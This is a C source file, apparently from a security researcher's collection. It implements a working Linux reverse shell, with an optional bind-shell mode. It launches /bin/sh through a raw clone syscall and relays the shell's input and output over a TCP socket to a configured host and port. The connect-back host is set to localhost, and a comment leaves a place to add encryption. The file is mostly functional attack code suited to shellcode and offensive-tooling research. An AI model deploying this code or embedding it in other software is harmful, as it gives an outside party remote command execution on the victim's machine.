 /**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#define _GNU_SOURCE

#define PORT "1234"
#define HOST "127.0.0.1"

#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/epoll.h>
#include <fcntl.h>
#include <sched.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

int main(void) {
    struct sockaddr_in sa;
    int                i, r, w, s, len, efd; 
    #ifdef BIND
    int                s2;
    #endif
    int                fd, in[2], out[2];
    char               buf[BUFSIZ];
    struct epoll_event evts;
    char               *args[]={"/bin/sh", NULL};
    pid_t              ctid, pid;
 
    // create pipes for redirection of stdin/stdout/stderr
    pipe2(in, 0);
    pipe2(out, 0);

    // fork process
    ctid = syscall(SYS_gettid);
    
    pid  = syscall(SYS_clone, 
        CLONE_CHILD_SETTID   | 
        CLONE_CHILD_CLEARTID | 
        SIGCHLD, 0, NULL, 0, &ctid);

    // if child process
    if (pid == 0) {
      // assign read end to stdin
      dup3(in[0],  STDIN_FILENO,  0);
      // assign write end to stdout   
      dup3(out[1], STDOUT_FILENO, 0);
      // assign write end to stderr  
      dup3(out[1], STDERR_FILENO, 0);  
      
      // close pipes
      close(in[0]);  close(in[1]);
      close(out[0]); close(out[1]);
      
      // execute shell
      execve(args[0], args, 0);
    } else {      
      // close read and write ends
      close(in[0]); close(out[1]);
      
      // create a socket
      s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      
      sa.sin_family = AF_INET;
      sa.sin_port   = htons(atoi(PORT));
      
      #ifdef BIND
        // bind to port for incoming connections
        sa.sin_addr.s_addr = INADDR_ANY;
        
        bind(s, (struct sockaddr*)&sa, sizeof(sa));
        listen(s, 0);
        r = accept(s, 0, 0);
        s2 = s; s = r;
      #else
        // connect to remote host
        sa.sin_addr.s_addr = inet_addr(HOST);
      
        r = connect(s, (struct sockaddr*)&sa, sizeof(sa));
      #endif
      
      // if ok
      if (r >= 0) {
        // open an epoll file descriptor
        efd = epoll_create1(0);
 
        // add 2 descriptors to monitor stdout and socket
        for (i=0; i<2; i++) {
          fd = (i==0) ? s : out[0];
          evts.data.fd = fd;
          evts.events  = EPOLLIN;
        
          epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
        }
          
        // now loop until user exits or some other error
        for (;;) {
          r = epoll_pwait(efd, &evts, 1, -1, NULL);
                  
          // error? bail out           
          if (r < 0) break;
         
          // not input? bail out
          if (!(evts.events & EPOLLIN)) break;

          fd = evts.data.fd;
          
          // assign socket or read end of output
          r = (fd == s) ? s     : out[0];
          // assign socket or write end of input
          w = (fd == s) ? in[1] : s;

          // read from socket or stdout        
          len = read(r, buf, BUFSIZ);

          if (!len) break;
          
          // encrypt/decrypt data here
          
          // write to socket or stdin        
          write(w, buf, len);        
        }      
        // remove 2 descriptors 
        epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);                  
        epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);                  
        close(efd);
        // shutdown socket
        shutdown(s, SHUT_RDWR);
      }
      close(s);
      #ifdef BIND
        close(s2);
      #endif
      // terminate shell      
      kill(pid, SIGCHLD);            
    }
    close(in[1]);
    close(out[0]);
    return 0; 
}
    
